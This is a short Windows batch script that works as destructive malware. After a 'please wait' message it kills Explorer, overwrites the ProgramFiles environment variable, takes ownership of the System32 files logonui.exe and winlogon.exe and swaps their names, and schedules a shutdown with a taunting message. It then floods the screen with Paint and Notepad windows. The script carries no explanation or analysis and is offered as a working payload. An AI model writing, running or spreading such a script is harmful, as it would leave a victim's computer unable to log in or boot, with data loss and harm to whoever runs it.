@echo off
echo please wait...
timeout /T 3 /NOBREAK
setx ProgramFiles="C:/Windows/System32/cmd.exe"
taskkill /f /im explorer.exe
timeout /T 2 /NOBREAK
start mspaint
start notepad
takeown /f c:\windows\system32\logonui.exe
takeown /f c:\windows\system32\winlogon.exe
ren c:\windows\system32\logonui.exe winlogon2.exe
ren c:\windows\system32\winlogon.exe logonui2.exe
ren c:\windows\system32\logonui2.exe logonui.exe
ren c:\windows\system32\winlogon2.exe winlogon.exe
shutdown /s /t 120 /c "YOUR PC HAS BEEN FUCKED, ENJOY HAVING NO PC!!!"
start explorer.exe
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
start mspaint
start notepad
v